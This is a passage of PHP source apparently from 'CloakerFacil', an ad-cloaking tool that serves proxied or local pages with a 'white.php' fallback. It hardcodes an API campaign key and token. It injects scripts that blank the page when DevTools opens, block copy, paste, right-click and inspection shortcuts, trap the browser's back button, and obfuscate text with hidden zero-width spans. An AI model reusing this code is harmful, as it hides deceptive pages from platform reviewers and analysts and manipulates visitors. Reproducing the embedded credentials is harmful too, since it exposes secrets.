<?php

namespace CloakerFacil;

use Exception;
use Throwable;
use DOMDocument;
use DOMXPath;

class AppConfig
{
    public const GENERATE_REPLACE_FILE = false; // Defina como 'true' para gerar o arquivo de substituição
    public const REPLACE_FILE_NAME = 'replaces.json'; // Nome do arquivo JSON para substituições de informações
    public const ERROR_PAGE_PATH = 'white.php'; // Defina o caminho para a página de erro
    public const USE_COOKIES = true; // Defina como 'true' para salvar os cookies no arquivo local
    public const REDIRECT_EXTERNAL_URLS = false; // Defina como 'true' para redirecionar URLs externas
    public const OBFUSCATE_CONTENT = true; // Defina como 'true' para ativar a ofuscação de conteúdo
    public const DISABLE_DEVTOOLS = true; // Defina como 'true' para bloquear DevTools
    public const BLOCK_COPY_PASTE = true; // Defina como 'true' para bloquear copiar, colar, selecionar, arrastar e inspecionar
    // Constante para o nome do arquivo de cache
    #public const CACHE_FILE_NAME = 'cache_file_name.cache'; // Nome do arquivo de cache
}


class LogConstants
{
    public const LOG_ENABLED = true;
    public const LOG_FILE = 'log_view.log';
    public const MAX_LOG_SIZE = 5242880;
    public const MAX_LOG_AGE = 604800;
    public const LOG_LEVEL = 'ERROR'; // Pode ser 'ERROR' ou 'DEBUG'
}

class CacheConstants
{
    public const CACHE_ENABLED = false; // Ative o cache
    public const CACHE_PATH = '_cache/';
    public const CACHE_EXPIRATION = 3600; // 1 hora para conteúdo local
    public const EXTERNAL_CACHE_EXPIRATION = 86400; // 24 horas para conteúdo externo

}

class ApiConstants
{
    public const API_URL = 'https://api.cloakerfacil.com.br';
    public const CAMPAIGN_KEY = 'oOp1auRkEd6b37af9d9a5898044cd30c24fe151c6pJWvr4U5a';
    public const TOKEN = 'wxR17Hjup08777d8eb4209599b89c75657f67be4ezWrIfXLTP';
}

class Application
{
    public function run(string $target)
    {
        try {
            // Verificar e bloquear acesso antes de carregar qualquer conteúdo
            if (AppConfig::DISABLE_DEVTOOLS && $this->detectDevToolsOrEmulation()) {
                exit;
            }

            // Garantir que o diretório de cache exista
            $this->ensureCacheDirectoryExists();

            $cacheEnabled = CacheConstants::CACHE_ENABLED;

            if ($cacheEnabled) {
                $cacheFile = $this->getCacheFile($target);

                if ($this->isCacheValid($cacheFile)) {
                    Logger::logDebug("Carregando conteúdo do cache: {$cacheFile}");
                    $content = $this->loadCacheContent($cacheFile);
                } else {
                    $content = $this->handleContent($target);
                    $this->storeCacheContent($content, $cacheFile);
                }
            } else {
                $content = $this->handleContent($target);
            }

            // Aplicar substituições ao conteúdo
            $content = $this->applySubstitutions($content);

            // Só aplicar ofuscação se for ativado na configuração
            if (AppConfig::OBFUSCATE_CONTENT && !$this->isExternalTarget($target)) {
                $content = $this->obfuscateContent($content);
            }

            // Adicionar script JavaScript para bloquear copiar, colar, selecionar, arrastar e inspecionar
            if (AppConfig::BLOCK_COPY_PASTE) {
                $content .= '
    <script>
    (function() {
        // Função para bloquear ações como copiar, colar, e inspecionar
        document.addEventListener("copy", (e) => e.preventDefault());
        document.addEventListener("paste", (e) => e.preventDefault());
        document.addEventListener("cut", (e) => e.preventDefault());
        document.addEventListener("contextmenu", (e) => e.preventDefault());
        document.addEventListener("selectstart", (e) => e.preventDefault());
        document.addEventListener("dragstart", (e) => e.preventDefault());

        // Bloquear atalhos de teclado que podem ser usados para copiar, inspecionar, etc.
        document.addEventListener("keydown", function (e) {
            if (e.keyCode == 123 || // F12
                (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C
                (e.ctrlKey && e.keyCode == 85)) { // Ctrl+U
                e.preventDefault();
                bloquearAcesso();
            }
        });

        // Bloquear o botão "voltar"
        window.history.pushState(null, document.title, location.href);
        window.addEventListener("popstate", function(event) {
            window.history.pushState(null, document.title, location.href);
        });

        // Função para bloquear o carregamento da página
        function bloquearAcesso() {
            setTimeout(function() {
                try {
                    window.open("about:blank", "_self");
                    window.close();
                } catch (e) {
                    location.href = "about:blank";
                }
            }, 100);
        }

    })();
    </script>';
            }
            echo $content;
        } catch (Exception $e) {
            Logger::logError('Erro durante o processamento da requisição: ' . $e->getMessage());
        }
    }



    private function detectDevToolsOrEmulation(): void
    {
        echo '
        <script src="https://cdn.jsdelivr.net/npm/devtools-detector/lib/devtools-detector.js"></script>
       

        <script>
            document.addEventListener("DOMContentLoaded", function () {
                if (typeof devtoolsDetector !== "undefined") {
                    // Adicionar listener para detectar DevTools
                    devtoolsDetector.addListener(function (isOpen, detail) {
                        if (isOpen) {
                            // Ação quando DevTools está aberto
                            document.body.innerHTML = ""; // Limpa o conteúdo da página
                            document.body.style.backgroundColor = "#ffffff";
                            console.log("Conteúdo removido devido à detecção do DevTools.");
                        } else {
                            console.log("DevTools fechado.");
                        }
                    });
    
                    // Iniciar a detecção
                    devtoolsDetector.launch();
                } else {
                    alert("A biblioteca devtools-detector não foi carregada.");
                }
            });
        </script>';
    }






    private function obfuscateContent(string $content): string
    {
        // Usar regex para capturar e preservar tags específicas
        preg_match_all('/<(script|style|title|meta|noscript|link)[^>]*>.*?<\/\1>/si', $content, $matches);
        $preservedTags = [];
        foreach ($matches[0] as $index => $match) {
            $placeholder = "<!-- PRESERVE_TAG_{$index} -->";
            $preservedTags[$placeholder] = $match;
            $content = str_replace($match, $placeholder, $content);
        }

        // Ofuscar o conteúdo restante
        $content = $this->obfuscateTextNodes($content);

        // Restaurar as tags preservadas
        foreach ($preservedTags as $placeholder => $originalTag) {
            $content = str_replace($placeholder, $originalTag, $content);
        }

        return $content;
    }

    private function obfuscateTextNodes(string $content): string
    {
        // Carregar o HTML no DOMDocument
        $dom = new DOMDocument('1.0', 'UTF-8');
        libxml_use_internal_errors(true);
        $dom->loadHTML($content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        // Usar XPath para encontrar todos os nós de texto, exceto dentro de <script> e <style>
        $xpath = new DOMXPath($dom);
        $textNodes = $xpath->query('//text()[not(ancestor::script) and not(ancestor::style)]');

        foreach ($textNodes as $textNode) {
            $originalText = $textNode->nodeValue;

            // Ignorar texto vazio
            if (trim($originalText) === '') {
                continue;
            }

            // Adicionar spans invisíveis para ofuscar o texto
            $obfuscatedText = '';
            for ($i = 0; $i < mb_strlen($originalText); $i++) {
                $char = mb_substr($originalText, $i, 1);
                $obfuscatedText .= htmlspecialchars($char, ENT_NOQUOTES, 'UTF-8');
                if ($char !== ' ') {
                    $obfuscatedText .= '<span style="display:none;">&#8203;</span>';
                }
            }

            // Substituir o texto original pelo texto ofuscado
            $fragment = $dom->createDocumentFragment();
            $fragment->appendXML($obfuscatedText);
            $textNode->parentNode->replaceChild($fragment, $textNode);
        }

        return $dom->saveHTML();
    }







    public function displayErrorPage()
    {
        $errorPagePath = AppConfig::ERROR_PAGE_PATH;

        // Garantir que o diretório de cache exista
        $this->ensureCacheDirectoryExists();

        $cacheEnabled = CacheConstants::CACHE_ENABLED;
        if ($cacheEnabled) {
            $cacheFile = $this->getCacheFile($errorPagePath);
            if ($this->isCacheValid($cacheFile)) {
                Logger::logDebug("Carregando conteúdo do cache: {$cacheFile}");
                $content = $this->loadCacheContent($cacheFile);
            } else {
                $content = $this->handleContent($errorPagePath);
                $this->storeCacheContent($content, $cacheFile);
            }
        } else {
            $content = $this->handleContent($errorPagePath);
        }

        // Aplicar substituições ao conteúdo
        $content = $this->applySubstitutions($content);


        // Definir o cabeçalho Content-Type com charset UTF-8
        header('Content-Type: text/html; charset=UTF-8');

        echo $content;
    }
    private function applySubstitutions(string $content): string
    {
        // Carregar substituições do arquivo JSON
        $replacements = ExternalSiteLoader::loadReplacesFromJsonFile('replaces');

        if (empty($replacements)) {
            // Não há substituições a serem aplicadas
            return $content;
        }

        // Carregar o conteúdo em um DOMDocument
        $dom = new DOMDocument('1.0', 'UTF-8');
        libxml_use_internal_errors(true);
        $dom->loadHTML($content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        // Aplicar as substituições
        ExternalSiteLoader::applyReplacements($dom, $replacements);

        // Retornar o conteúdo modificado
        return $dom->saveHTML();
    }

    private function ensureCacheDirectoryExists()
    {
        $cachePath = __DIR__ . DIRECTORY_SEPARATOR . rtrim(CacheConstants::CACHE_PATH, '/\\');
        Logger::logDebug("Cache path (ensureCacheDirectoryExists): {$cachePath}");

        if (!is_dir($cachePath)) {
            if (!mkdir($cachePath, 0755, true)) {
                Logger::logError("Não foi possível criar o diretório de cache: {$cachePath}");
            } else {
                // Definir permissões para o diretório de cache
                chmod($cachePath, 0755);
                Logger::logDebug("Diretório de cache criado: {$cachePath}");
            }
        } else {
            Logger::logDebug("Diretório de cache já existe: {$cachePath}");
        }
    }

    private function handleContent($target)
    {
        Logger::logDebug("handleContent chamado com o alvo: '{$target}'");
        try {
            // Remover qualquer barra final do alvo, para normalizar a verificação
            $target = rtrim($target, '/');

            // Corrigir a URL se o protocolo estiver incorreto
            if (preg_match('/^ht{2,}tps?:\/\//i', $target)) {
                Logger::logDebug("Corrigindo protocolo incorreto na URL: '{$target}'");
                $target = preg_replace('/^ht{2,}tps?:\/\//i', 'https://', $target);
            }

            $serverHost = strtolower($_SERVER['HTTP_HOST'] ?? '');

            // Primeiro, verificar se é uma URL válida completa
            if (filter_var($target, FILTER_VALIDATE_URL)) {
                Logger::logDebug("Alvo é uma URL válida: '{$target}'");

                // Verificar se deve redirecionar em vez de exibir a página
                if (AppConfig::REDIRECT_EXTERNAL_URLS) {
                    Logger::logDebug("Redirecionando para URL externa: '{$target}'");
                    header('Location: ' . $target);
                    exit;
                }

                return $this->handleUrlTarget($target);
            }

            // Verificar se o alvo é o próprio domínio do servidor
            if (strpos($target, $serverHost) === 0) {
                Logger::logDebug("Alvo contém o próprio domínio do servidor: '{$target}'");
                // Remover o domínio do início do target
                $target = ltrim(str_replace($serverHost, '', $target), '/\\');
                Logger::logDebug("Alvo ajustado após remover o domínio: '{$target}'");
            }

            // Verificar se é um arquivo local pelo tipo de extensão
            $fileExtension = pathinfo($target, PATHINFO_EXTENSION);
            if (in_array($fileExtension, ['php', 'html', 'htm', 'js', 'css'])) {
                Logger::logDebug("Alvo é identificado como um arquivo local: '{$target}'");

                // Verificar se o arquivo existe e é válido
                if (FileLoader::isValidFile($target)) {
                    Logger::logDebug("Arquivo local encontrado: '{$target}'");

                    // Se for um arquivo PHP, vamos executá-lo
                    if ($fileExtension === 'php') {
                        $fullPath = realpath($target);
                        if ($fullPath === false) {
                            Logger::logError('Caminho do arquivo inválido: ' . $target);
                            return '';
                        }

                        // Inicia o buffer de saída
                        ob_start();

                        try {
                            (function () use ($fullPath) {
                                require $fullPath;
                            })();
                        } catch (Exception $e) {
                            Logger::logError('Erro ao incluir o arquivo PHP: ' . $e->getMessage());
                            ob_end_clean();
                            return '';
                        }

                        $content = ob_get_clean();
                        $content = $this->adjustRelativePaths($content, dirname($target));
                        return $content;
                    }

                    // Carregar conteúdo de outros tipos de arquivos
                    return FileLoader::loadLocalFileContent($target);
                } else {
                    Logger::logError("Arquivo local não encontrado ou inválido: '{$target}'");
                    return '';
                }
            }

            // Verificar se é um domínio sem esquema (por exemplo, 'google.com')
            if (preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $target)) {
                Logger::logDebug("Alvo é um domínio sem esquema: '{$target}'");
                $targetWithScheme = 'https://' . $target;

                // Verificar se deve redirecionar em vez de exibir a página
                if (AppConfig::REDIRECT_EXTERNAL_URLS) {
                    Logger::logDebug("Redirecionando para URL externa: '{$targetWithScheme}'");
                    header('Location: ' . $targetWithScheme);
                    exit;
                }

                return $this->handleUrlTarget($targetWithScheme);
            }

            // Se não atender a nenhuma condição, retornar erro
            Logger::logError("Alvo inválido ou não encontrado: '{$target}'");
            return '';
        } catch (Exception $e) {
            Logger::logError('Erro ao processar conteúdo: ' . $e->getMessage() . "\n" . $e->getTraceAsString());
            return '';
        }
    }
    private function adjustRelativePaths(string $content, string $baseDir): string
    {
        // Se baseDir estiver vazio, use a raiz do servidor como base
        $basePath = rtrim($baseDir, '/') . '/';

        // Usar regex para encontrar src e href relativos e ajustá-los para usar o caminho correto
        $content = preg_replace_callback('/(src|href)=["\'](?!http:\/\/|https:\/\/|\/\/)([^"\']+)["\']/i', function ($matches) use ($basePath) {
            $attribute = $matches[1];
            $relativePath = $matches[2];

            // Criar o caminho absoluto para o recurso
            $newPath = $basePath . ltrim($relativePath, '/');
            return $attribute . '="' . $newPath . '"';
        }, $content);

        return $content;
    }

    private function handleUrlTarget(string $target): string
    {
        $parsedUrl = parse_url($target);
        if ($parsedUrl === false) {
            Logger::logError("Falha ao analisar o alvo: {$target}");
            return '';
        }

        $targetHost = strtolower($parsedUrl['host'] ?? '');
        $serverHost = strtolower($_SERVER['HTTP_HOST'] ?? '');

        // Remover 'www.' se presente
        $targetHost = preg_replace('/^www\./i', '', $targetHost);
        $serverHost = preg_replace('/^www\./i', '', $serverHost);

        Logger::logDebug("SERVER['HTTP_HOST']: '{$_SERVER['HTTP_HOST']}'");
        Logger::logDebug("Alvo é uma URL. Host do alvo normalizado: '{$targetHost}', Host do servidor normalizado: '{$serverHost}'");

        if ($targetHost === $serverHost) {
            // Mesmo domínio, tentar carregar o arquivo localmente
            $filePath = $parsedUrl['path'] ?? '';
            // Remover a barra inicial, se existir
            $filePath = ltrim($filePath, '/\\');
            Logger::logDebug("Tentando carregar arquivo local: '{$filePath}'");

            if (FileLoader::isValidFile($filePath)) {
                return FileLoader::loadLocalFileContent($filePath);
            } else {
                Logger::logError("Arquivo local não encontrado ou inválido: '{$filePath}'");
                return '';
            }
        } else {
            // Domínio externo, carregar conteúdo do site externo
            Logger::logDebug("Carregando conteúdo de site externo: {$target}");
            return ExternalSiteLoader::loadExternalSiteContent($target);
        }
    }

    public function getCacheFile(string $target): string
    {
        // Determinar se o alvo é externo ou local
        $isExternal = $this->isExternalTarget($target);


        if ($isExternal) {
            // O alvo é externo, usar o domínio externo para o cache
            $parsedUrl = parse_url($target);
            if ($parsedUrl === false || !isset($parsedUrl['host'])) {
                Logger::logError("URL de destino inválida: {$target}");
                return '';
            }

            $externalDomain = strtolower($parsedUrl['host']);
            // Remover 'www.' se presente
            $externalDomain = preg_replace('/^www\./i', '', $externalDomain);

            // Criar o diretório de cache para o domínio externo
            $cacheDir = __DIR__ . DIRECTORY_SEPARATOR . rtrim(CacheConstants::CACHE_PATH, '/\\') . DIRECTORY_SEPARATOR . $externalDomain;
        } else {
            // O alvo é local, usar um diretório de cache para arquivos locais
            $cacheDir = __DIR__ . DIRECTORY_SEPARATOR . rtrim(CacheConstants::CACHE_PATH, '/\\') . DIRECTORY_SEPARATOR . 'local';
        }

        if (!is_dir($cacheDir)) {
            if (!mkdir($cacheDir, 0755, true)) {
                Logger::logError("Não foi possível criar o diretório de cache: {$cacheDir}");
            } else {
                chmod($cacheDir, 0755);
                Logger::logDebug("Diretório de cache criado: {$cacheDir}");
            }
        } else {
            Logger::logDebug("Diretório de cache já existe: {$cacheDir}");
        }

        // Gerar a chave de cache
        $cacheKey = md5($target);

        // Definir a extensão do arquivo de cache
        $cacheExtension = $isExternal ? '.external.cache' : '.cache';

        $cacheFilePath = $cacheDir . DIRECTORY_SEPARATOR . $cacheKey . $cacheExtension;
        #$cacheFilePath = __DIR__ . DIRECTORY_SEPARATOR . CacheConstants::CACHE_PATH . DIRECTORY_SEPARATOR . $cacheDir . DIRECTORY_SEPARATOR . AppConfig::CACHE_FILE_NAME;

        Logger::logDebug("Caminho do arquivo de cache: {$cacheFilePath}");
        return $cacheFilePath;
    }

    private function isExternalTarget(string $target): bool
    {
        // Verificar se o arquivo existe localmente
        if (FileLoader::isValidFile($target)) {
            return false; // É um arquivo local
        }

        // Verificar se é uma URL válida
        if (filter_var($target, FILTER_VALIDATE_URL)) {
            $parsedUrl = parse_url($target);
            if (isset($parsedUrl['host'])) {
                $targetHost = strtolower($parsedUrl['host']);
                $serverHost = strtolower($_SERVER['HTTP_HOST'] ?? '');

                // Remover 'www.' se presente
                $targetHost = preg_replace('/^www\./i', '', $targetHost);
                $serverHost = preg_replace('/^www\./i', '', $serverHost);

                Logger::logDebug("Comparando targetHost: '{$targetHost}' com serverHost: '{$serverHost}'");

                return $targetHost !== $serverHost;
            }
            return false;
        }

        // Verificar se é um domínio sem esquema
        if (preg_match('/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $target)) {
            // Adicionar 'https://' e validar novamente
            $targetWithScheme = 'https://' . $target;
            return $this->isExternalTarget($targetWithScheme);
        }

        // Não é externo
        return false;
    }


    public function isCacheValid(string $cacheFile): bool
    {
        try {
            if (!is_file($cacheFile) || !is_readable($cacheFile)) {
                Logger::logDebug("Cache inválido ou inexistente: {$cacheFile}");
                return false;
            }
            $cacheTime = filemtime($cacheFile);
            if ($cacheTime === false) {
                Logger::logError("Falha ao ler o horário de modificação do arquivo de cache: {$cacheFile}");
                return false;
            }
            $currentTime = time();
            $timeDiff = $currentTime - $cacheTime;

            // Determine se o cache é para conteúdo externo
            $isExternalCache = strpos($cacheFile, '.external.cache') !== false;

            // Use o tempo de expiração apropriado
            $expiration = $isExternalCache ? CacheConstants::EXTERNAL_CACHE_EXPIRATION : CacheConstants::CACHE_EXPIRATION;

            if ($timeDiff < $expiration) {
                Logger::logDebug("Cache válido encontrado: {$cacheFile}");
                return true;
            } else {
                if (unlink($cacheFile) === false) {
                    Logger::logError("Falha ao deletar o arquivo de cache: {$cacheFile}");
                }
                Logger::logDebug("Cache expirado: {$cacheFile}");
                return false;
            }
        } catch (Throwable $e) {
            Logger::logError("Ocorreu um erro inesperado em isCacheValid: {$e->getMessage()}");
            return false;
        }
    }

    private function storeCacheContent(string $content, string $cacheFile)
    {
        try {
            $compressedContent = gzcompress($content, 9);
            $bytesWritten = file_put_contents($cacheFile, $compressedContent);

            if ($bytesWritten === false) {
                Logger::logError("Falha ao salvar o conteúdo no arquivo de cache: {$cacheFile}");
            } else {
                Logger::logDebug("Conteúdo armazenado em cache: {$cacheFile}");
            }
        } catch (Throwable $e) {
            $errorMessage = "Ocorreu um erro ao armazenar o conteúdo em cache: {$e->getMessage()}";
            Logger::logError($errorMessage);
        }
    }

    public function loadCacheContent(string $cacheFile): string
    {
        try {
            if (!is_file($cacheFile) || !is_readable($cacheFile)) {
                Logger::logError("Arquivo de cache não encontrado ou não é legível: {$cacheFile}");
                return '';
            }
            $compressedContent = file_get_contents($cacheFile);
            if ($compressedContent === false) {
                Logger::logError("Falha ao ler o conteúdo do arquivo de cache: {$cacheFile}");
                return '';
            }
            $content = gzuncompress($compressedContent);
            if ($content === false) {
                Logger::logError("Falha ao descomprimir o conteúdo do cache: {$cacheFile}");
                return '';
            }
            return $content;
        } catch (Throwable $e) {
            $errorMessage = "Ocorreu um erro ao carregar o conteúdo do cache: {$e->getMessage()}";
            Logger::logError($errorMessage);
            return '';
        }
    }
}

class FileLoader
{
    public static function isValidFile(string $relativePath): bool
    {
        $basePath = realpath(__DIR__);
        $normalizedRelativePath = self::normalizePath($relativePath);
        $absolutePath = $basePath . DIRECTORY_SEPARATOR . $normalizedRelativePath;

        Logger::logDebug("Base path: '{$basePath}'");
        Logger::logDebug("Normalized relative path: '{$normalizedRelativePath}'");
        Logger::logDebug("Absolute path: '{$absolutePath}'");

        // Verificar se o arquivo existe
        if (!file_exists($absolutePath)) {
            //  Logger::logError('Arquivo não encontrado: ' . $absolutePath);
            return false;
        }

        // Verificar se o caminho está dentro do diretório base
        if (strpos(realpath($absolutePath), $basePath) !== 0) {
            Logger::logError('Caminho do arquivo fora do diretório permitido: ' . $relativePath);
            return false;
        }

        if (is_file($absolutePath)) {
            Logger::logDebug('Arquivo válido encontrado: ' . $absolutePath);
            return true;
        } else {
            Logger::logError('Não é um arquivo válido: ' . $absolutePath);
            return false;
        }
    }

    private static function normalizePath(string $path): string
    {
        $parts = [];
        $path = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
        $segments = explode(DIRECTORY_SEPARATOR, $path);
        foreach ($segments as $segment) {
            if ($segment === '.' || $segment === '') {
                continue;
            } elseif ($segment === '..') {
                array_pop($parts);
            } else {
                $parts[] = $segment;
            }
        }
        return implode(DIRECTORY_SEPARATOR, $parts);
    }

    public static function loadLocalFileContent(string $relativePath): string
    {
        $basePath = realpath(__DIR__);
        $normalizedRelativePath = self::normalizePath($relativePath);
        $absolutePath = $basePath . DIRECTORY_SEPARATOR . $normalizedRelativePath;
        Logger::logDebug("Carregando conteúdo do arquivo: Relativo '{$relativePath}', Absoluto '{$absolutePath}'");

        if (strpos(realpath(dirname($absolutePath)), $basePath) !== 0) {
            Logger::logError('Caminho do arquivo inválido ou fora do diretório permitido: ' . $relativePath);
            return '';
        }

        if (is_dir($absolutePath)) {
            $indexFiles = ['index.php', 'index.html'];
            foreach ($indexFiles as $indexFile) {
                $indexPath = $absolutePath . DIRECTORY_SEPARATOR . $indexFile;
                if (is_file($indexPath)) {
                    $absolutePath = $indexPath;
                    break;
                }
            }
            if (!is_file($absolutePath)) {
                Logger::logError('Nenhum arquivo index encontrado no diretório: ' . $absolutePath);
                return '';
            }
        }

        if (is_file($absolutePath)) {
            $content = file_get_contents($absolutePath);

            if ($content !== false) {
                // Ajustar os caminhos dos recursos se o arquivo for index.html
                if (strpos($absolutePath, 'index.html') !== false) {
                    $relativeDirectory = str_replace($basePath, '', dirname($absolutePath));
                    $relativeDirectory = ltrim($relativeDirectory, '/');

                    // Atualizar caminhos relativos para scripts, links, e outros recursos
                    $pattern = '/(src|href)=["\'](?!http:\/\/|https:\/\/|\/\/)([^"\']+)["\']/i';
                    $replacement = function ($matches) use ($relativeDirectory) {
                        $path = $matches[2];

                        // Se o caminho começar com "/", ajustamos para usar o diretório relativo
                        if (strpos($path, '/') === 0) {
                            return $matches[1] . '="' . rtrim($relativeDirectory, '/') . $path . '"';
                        }

                        // Normalizar caminhos começando com ./ ou .
                        if (strpos($path, './') === 0 || strpos($path, '.') === 0) {
                            $path = preg_replace('#^\./#', '', $path); // Remove './' do início
                        }

                        // Para outros casos, adicionamos o diretório relativo
                        return $matches[1] . '="' . rtrim($relativeDirectory, '/') . '/' . ltrim($path, '/') . '"';
                    };

                    $content = preg_replace_callback($pattern, $replacement, $content);

                    // Verificar se o conteúdo utiliza FontAwesome
                    if (self::containsFontAwesomeClasses($content)) {
                        // Adicionar FontAwesomeStyles ao <head>
                        $content = self::addFontAwesomeStyles($content);
                    }
                }
                return $content;
            } else {
                Logger::logError("Erro ao ler o arquivo: " . $absolutePath);
            }
        } else {
            Logger::logError('O arquivo não existe ou não é válido: ' . $absolutePath);
        }

        return '';
    }

    private static function containsFontAwesomeClasses(string $content): bool
    {
        // Procurar por classes típicas do FontAwesome no conteúdo
        return preg_match('/class=["\'].*\b(fa|fas|fab|fa-solid|fa-regular)\b.*["\']/', $content);
    }

    private static function addFontAwesomeStyles(string $content): string
    {
        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML($content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        $head = $dom->getElementsByTagName('head')->item(0);
        if ($head) {
            $fontAwesomeStyles = [
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css',
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-solid.css',
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-regular.css',
                'https://site-assets.fontawesome.com/releases/v6.4.2/css/sharp-light.css',
            ];
            foreach ($fontAwesomeStyles as $style) {
                $link = $dom->createElement('link');
                $link->setAttribute('rel', 'stylesheet');
                $link->setAttribute('href', $style);
                $head->appendChild($link);
            }
        }

        // Retornar o HTML atualizado
        return $dom->saveHTML();
    }
}

class ExternalSiteLoader
{
    public static function loadExternalSiteContent(string $url): string
    {
        $url = self::prepareUrl($url);
        Logger::logDebug("Preparando para carregar conteúdo externo de: {$url}");
        $data = self::loadUrlWithCurl($url);
        if ($data === false) {
            $data = self::loadUrlWithFileGetContents($url);
        }
        if ($data === false) {
            Logger::logError('Falha ao carregar o conteúdo do site: ' . $url);
            return '';
        }

        // Detectar e converter a codificação do conteúdo
        $data = self::detectAndConvertEncoding($data);

        // Carregar o DOM
        $dom = new DOMDocument('1.0', 'UTF-8');
        libxml_use_internal_errors(true);
        $dom->loadHTML('<?xml encoding="UTF-8">' . $data, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        // Corrigir os caminhos dos recursos
        self::fixPathsResourcesInDom($dom, $url);

        // Adicionar estilos do Font Awesome
        self::addFontAwesomeStylesToDom($dom);

        // Retornar o HTML atualizado
        return $dom->saveHTML();
    }


    public static function applyReplacements(DOMDocument $dom, array $replacements)
    {
        $xpath = new DOMXPath($dom);

        foreach ($replacements as $replacement) {
            // Verificar se a substituição está habilitada
            if (isset($replacement['enabled']) && !$replacement['enabled']) {
                Logger::logDebug("Substituição desativada para o seletor: " . ($replacement['selector'] ?? "substituição direta"));
                continue;
            }

            $type = $replacement['type'];
            $value = $replacement['value'];
            $newValue = $replacement['newValue'] ?? null;
            $attribute = $replacement['attribute'] ?? null;
            $selector = $replacement['selector'] ?? null;
            $selectorType = $replacement['selectorType'] ?? 'css';

            // Se um seletor estiver definido, usar seletor (CSS ou XPath)
            if ($selector) {
                // Determinar se o seletor é XPath ou CSS
                if ($selectorType === 'xpath') {
                    $nodes = $xpath->query($selector);
                } else {
                    $nodes = self::querySelectorAll($dom, $selector);
                }

                if ($nodes === false || $nodes->length === 0) {
                    Logger::logError("Erro ao executar o seletor: {$selector}");
                    continue;
                }

                foreach ($nodes as $node) {
                    self::applyNodeReplacement($node, $type, $value, $attribute, $newValue, $dom);
                }
            } else {
                // Se não houver seletor, substituir texto diretamente no DOM
                if ($type === 'text') {
                    self::replaceTextInDom($dom, $value, $newValue);
                } elseif ($type === 'link') {
                    self::replaceLinkInDom($dom, $value, $newValue);
                }
            }
        }
    }

    private static function applyNodeReplacement($node, $type, $value, $attribute, $newValue, DOMDocument $dom)
    {
        switch ($type) {
            case 'text':
                $node->nodeValue = $newValue ?: $value;
                break;

            case 'attribute':
                if ($attribute !== null) {
                    $node->setAttribute($attribute, $newValue ?: $value);
                }
                break;

            case 'html':
                // Substituir o conteúdo interno do nó por HTML
                $fragment = $dom->createDocumentFragment();
                $fragment->appendXML($newValue ?: $value);
                while ($node->hasChildNodes()) {
                    $node->removeChild($node->firstChild);
                }
                $node->appendChild($fragment);
                break;

            case 'remove':
                // Remover o nó do DOM
                $node->parentNode->removeChild($node);
                break;

            case 'before':
                // Inserir HTML antes do nó
                $fragment = $dom->createDocumentFragment();
                $fragment->appendXML($newValue ?: $value);
                $node->parentNode->insertBefore($fragment, $node);
                break;

            case 'after':
                // Inserir HTML depois do nó
                $fragment = $dom->createDocumentFragment();
                $fragment->appendXML($newValue ?: $value);
                if ($node->nextSibling) {
                    $node->parentNode->insertBefore($fragment, $node->nextSibling);
                } else {
                    $node->parentNode->appendChild($fragment);
                }
                break;

            case 'addClass':
                // Adicionar classe ao nó existente
                $existingClasses = $node->getAttribute('class');
                $newClasses = $existingClasses . ' ' . ($newValue ?: $value);
                $node->setAttribute('class', trim($newClasses));
                break;

            case 'regex':
                // Substituir o valor do nó usando uma regex
                $currentValue = $node->nodeValue;
                $newValue = preg_replace($value, $newValue, $currentValue);
                $node->nodeValue = $newValue;
                break;

            default:
                Logger::logError("Tipo de substituição desconhecido: {$type}");
                break;
        }
    }

    private static function replaceTextInDom(DOMDocument $dom, string $oldText, string $newText)
    {
        // Percorrer todo o texto no DOM e substituir o conteúdo
        $xpath = new DOMXPath($dom);
        $textNodes = $xpath->query('//text()[contains(., "' . $oldText . '")]');

        foreach ($textNodes as $textNode) {
            $textNode->nodeValue = str_replace($oldText, $newText, $textNode->nodeValue);
        }
    }

    private static function replaceLinkInDom(DOMDocument $dom, string $oldLink, string $newLink)
    {
        // Substituir todos os links no DOM
        $xpath = new DOMXPath($dom);
        $linkNodes = $xpath->query('//a[contains(@href, "' . $oldLink . '")]');

        foreach ($linkNodes as $linkNode) {
            $linkNode->setAttribute('href', str_replace($oldLink, $newLink, $linkNode->getAttribute('href')));
        }
    }


    // Função para selecionar nós usando seletor CSS
    private static function querySelectorAll(DOMDocument $dom, string $selector): \DOMNodeList
    {
        $xpath = new DOMXPath($dom);
        $xpathQuery = self::cssToXpath($selector);
        return $xpath->query($xpathQuery);
    }

    // Conversão de CSS para XPath (mantido)
    private static function cssToXpath(string $selector): string
    {
        $selector = preg_replace('/\s+>\s+/', '/', trim($selector));
        $selector = preg_replace('/\s+/', '//', $selector);
        $selector = preg_replace('/#([\w\-]+)/', '[@id="$1"]', $selector);
        $selector = preg_replace('/\.([\w\-]+)/', '[contains(concat(" ", normalize-space(@class), " "), " $1 ")]', $selector);
        return '//' . $selector;
    }

    private static function detectAndConvertEncoding(string $data): string
    {
        // Detectar a codificação do conteúdo
        $encoding = mb_detect_encoding($data, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true);

        // Se não conseguir detectar, tentar extrair a partir das meta tags
        if ($encoding === false) {
            $encoding = self::extractEncodingFromMeta($data);
        }

        // Se ainda não conseguir detectar, assumir ISO-8859-1
        if ($encoding === false) {
            $encoding = 'ISO-8859-1';
        }

        Logger::logDebug("Codificação detectada: {$encoding}");

        // Converter para UTF-8 se necessário
        if (strtoupper($encoding) !== 'UTF-8') {
            $data = mb_convert_encoding($data, 'UTF-8', $encoding);
        }

        // Atualizar a meta tag charset para UTF-8
        $data = self::updateMetaCharset($data);

        return $data;
    }
